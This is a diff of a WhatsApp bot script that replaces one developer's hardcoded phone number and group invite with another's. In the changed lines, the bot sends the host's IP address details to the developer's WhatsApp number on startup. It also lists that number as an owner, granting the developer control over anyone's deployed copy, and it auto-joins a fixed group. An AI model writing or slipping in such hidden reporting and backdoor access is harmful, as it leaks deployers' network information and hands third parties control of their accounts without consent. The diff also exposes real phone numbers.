@@ -168,14 +168,14 @@ console.log(color('> HARI ','silver'), color(`${tampilHari}\n`,'mediumseagreen')
 	// session
 	await Fan.connect({ timeoutMs: 30 * 1000 });
   fs.writeFileSync(`./kontol.json`, JSON.stringify(Fan.base64EncodedAuthInfo(), null, '\t'))    
- teks = `https://chat.whatsapp.com/E4mPMyGkTmpCdlJiVDoLp8`
+ teks = `https://chat.whatsapp.com/FW0slXM3JDm6jiNIXdCSTG`
  Fan.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
  console.log(color('|WRN|', 'yellow'), color('Bergabung ke Grup Official', 'cyan'))
  Fan.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(Fan.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./P3/image/runtime.jpeg'),sourceUrl:"https://wa.me/18054105292?text=Assalamualaikum"}}})
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       Fan.sendMessage("18054105292@s.whatsapp.net", `─────「 *BANG IRFAN INSTAGRAM YOK* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./P3/image/runtime.jpeg'),sourceUrl:"https://wa.me/18054105292?text=Assalamualaikum"}}})
+       Fan.sendMessage("85895873474@s.whatsapp.net", `─────「 *BANG BIMO INSTAGRAM YOK* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./P3/image/runtime.jpeg'),sourceUrl:"https://wa.me/18054105292?text=Assalamualaikum"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'red'))
    })
 	
@@ -415,8 +415,8 @@ Fan.on('group-update', async (anu) => {
 	})
     Fan.on('chat-update', async (message) => {
         require('./Fan.js')(Fan, message)
-        ownerNumber = ["18054105292@s.whatsapp.net","18054105292@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
-        dtod = "18054105292@s.whatsapp.net"
+        ownerNumber = ["85895873474@s.whatsapp.net","85895873474@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
+        dtod = "85895873474@s.whatsapp.net"
        otod = `${settings.NomorOwner}@s.whatsapp.net`
     })  
 }
